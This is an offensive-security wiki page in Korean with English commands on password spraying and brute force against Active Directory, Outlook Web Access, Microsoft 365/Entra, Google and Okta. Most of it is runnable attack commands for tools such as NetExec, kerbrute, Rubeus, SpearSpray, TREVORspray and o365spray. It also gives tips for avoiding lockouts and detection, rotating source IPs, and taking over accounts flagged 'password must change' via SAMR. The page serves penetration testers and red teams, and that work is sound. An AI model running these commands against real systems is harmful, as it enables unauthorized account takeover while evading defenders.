# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

여러 **유효한 사용자 이름**을 찾은 후에는, 발견한 각 사용자에 대해 가장 **흔한 비밀번호**를 시도해볼 수 있습니다(환경의 password policy를 고려해야 함).\
**기본적으로** **최소** **password** **길이**는 **7**입니다.

흔한 사용자 이름 목록도 유용할 수 있습니다: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

여러 번 잘못된 password를 시도하면 일부 계정이 **lockout**될 수 있다는 점에 유의하세요(기본적으로 10회 이상).

### Get password policy

사용자 자격 증명이나 domain user로서의 shell이 있다면, 다음으로 **password policy를 확인할 수 있습니다**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux에서의 Exploitation (또는 모두)

- **crackmapexec** 사용:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- **NetExec (CME successor)**를 사용하여 SMB/WinRM 전반에 걸쳐 표적화된, 저소음 spraying 수행:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Using [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(잠금 차단을 피하기 위해 시도 횟수를 지정할 수 있음):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) 사용 - 권장되지 않음, 때때로 작동하지 않음
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- `Metasploit`의 `scanner/smb/smb_login` 모듈 사용:

![](<../../images/image (745).png>)

- `rpcclient` 사용:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows에서

- brute 모듈이 있는 [Rubeus](https://github.com/Zer1t0/Rubeus) 버전으로:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) 사용 시 (기본적으로 도메인에서 사용자 목록을 생성할 수 있고, 도메인에서 password policy를 가져와 그에 맞게 시도 횟수를 제한합니다):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- With [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon" 계정 식별 및 장악 (SAMR)

저소음 기법은 무해한/빈 비밀번호를 스프레이하고 STATUS_PASSWORD_MUST_CHANGE를 반환하는 계정을 잡는 것입니다. 이는 비밀번호가 강제로 만료되었고 이전 비밀번호를 몰라도 변경할 수 있음을 의미합니다.

워크플로:
- 대상 목록을 만들기 위해 사용자 열거 (SAMR를 통한 RID brute):

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- 빈 password를 spray하고, hit이 나면 계속 진행하여 다음 logon 시 변경해야 하는 accounts를 capture하기:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- 각 hit에 대해, NetExec의 module로 SAMR를 통해 password를 변경한다("must change"가 설정된 경우 이전 password는 필요하지 않음):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operational notes:
- Kerberos-based operations 전에 host clock를 DC와 동기화하세요: `sudo ntpdate <dc_fqdn>`.
- 일부 modules(예: RDP/WinRM)에서 (Pwn3d!) 없이 [+]가 표시되면, creds는 유효하지만 account에 interactive logon 권한이 없습니다.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth 기반 spraying은 SMB/NTLM/LDAP bind 시도보다 noise를 줄이고 AD lockout 정책과 더 잘 맞습니다. SpearSpray는 LDAP 기반 targeting, pattern engine, 그리고 policy awareness(domain policy + PSOs + badPwdCount buffer)를 결합해 정확하고 안전하게 spray합니다. 또한 BloodHound pathing을 위해 Neo4j에서 compromised principals를 태그할 수 있습니다.

핵심 아이디어:
- 페이지네이션과 LDAPS 지원을 포함한 LDAP user discovery, 필요 시 custom LDAP filters 사용 가능.
- Domain lockout policy + PSO-aware filtering으로 설정 가능한 attempt buffer(threshold)를 남겨 users가 lockout되지 않도록 함.
- 빠른 gssapi bindings를 사용한 Kerberos pre-auth validation(DC에서 4625 대신 4768/4771 생성).
- 각 user의 pwdLastSet에서 파생된 이름과 temporal values 같은 variables를 사용하는 pattern-based, per-user password generation.
- threads, jitter, max requests per second로 throughput control.
- BloodHound를 위해 owned users를 표시하는 Optional Neo4j integration.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
타겟팅 및 패턴 제어:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth and safety controls:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound enrichment:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Pattern system overview (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
사용 가능한 변수는 다음과 같습니다:
- {name}, {samaccountname}
- 각 사용자 pwdLastSet(또는 whenCreated)에서 가져온 Temporal: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers 및 org token: {separator}, {suffix}, {extra}

운영 메모:
- 가장 신뢰할 수 있는 badPwdCount 및 policy 관련 정보를 읽기 위해 -dc로 PDC-emulator를 조회하는 것을 우선하세요.
- badPwdCount reset은 관찰 창 다음 시도에서 트리거됩니다; 안전하게 유지하려면 threshold와 timing을 사용하세요.
- Kerberos pre-auth 시도는 DC telemetry에서 4768/4771으로 표시됩니다; jitter와 rate-limiting을 사용해 섞이도록 하세요.

> Tip: SpearSpray의 기본 LDAP page size는 200입니다; 필요에 따라 -lps로 조정하세요.

## Outlook Web Access

outlook에 대한 p**assword spraying**을 위한 여러 도구가 있습니다.

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- [Ruler](https://github.com/sensepost/ruler) 사용 (신뢰할 수 있음!)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) 사용 (Powershell)
- [MailSniper](https://github.com/dafthack/MailSniper) 사용 (Powershell)

이 도구들 중 아무거나 사용하려면, 사용자 목록과 password / 소수의 password 목록이 필요합니다.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

클라우드 spraying에서는 먼저 테넌트가 **managed**, **federated**, 또는 **hybrid**인지 식별하세요. 엔드포인트와 lockout 동작이 온프레미스 AD와 다를 수 있기 때문입니다. Microsoft Entra에서 **Smart Lockout**은 반복된 guess가 lockout budget을 소비하는 방식을 바꿉니다:

- 같은 **bad password**를 반복해도 lockout counter가 계속 증가하지 않지만, **새로운 후보**를 시도하면 증가합니다.
- **Familiar** 및 **unfamiliar** locations는 **별도** counter를 가집니다.
- **pass-through authentication (PTA)**를 사용하는 테넌트는 bad-password hash tracking의 이점을 얻지 못하므로, classic lockout-sensitive target처럼 다루세요.

실무에서는 라운드당 **한 개의 password**만 spraying하고, 라운드 사이에 충분한 간격을 두며, guess를 보내기 전에 테넌트의 실제 auth flow를 알아낼 수 있는 tooling을 우선하세요.

- [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray)를 사용하면 테넌트를 recon하고, `token_endpoint`를 찾아내고, `msol`/`adfs`/`owa`/`okta`를 spray할 수 있으며, 여러 egress IP를 통해 traffic을 rotate할 수 있습니다:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- [**Spray365**](https://github.com/MarkoH17/Spray365)를 사용하면 재개 가능한 **execution plan**을 미리 만들고, auth 순서를 무작위화하며, lockout window 밖에 머물도록 사용자당 **minimum delay**를 강제할 수 있습니다:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- [**o365spray**](https://github.com/0xZDH/o365spray)를 사용하면 tenant를 검증하고, `onedrive` 같은 module로 사용자를 열거할 수 있으며, `oauth2` 또는 `adfs`를 통해 spray하면서 lockout window마다 사용자당 **한 번의 시도**만 유지할 수 있습니다. 이미 FireProx API가 있다면, `--proxy-url`로 전달해 source IP를 분산하세요:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
최근 operator tradecraft도 **distributed cloud spraying** 쪽으로 이동했습니다. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration)는 시간 창, password shuffling, ADFS/M365 spraying, 그리고 자동 post-auth exfiltration을 지원합니다. 최근의 실제 악용 사례에서는 **Microsoft Teams API** account enumeration과 **AWS region rotation**을 사용해 spray wave를 여러 source geography에 분산했습니다.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
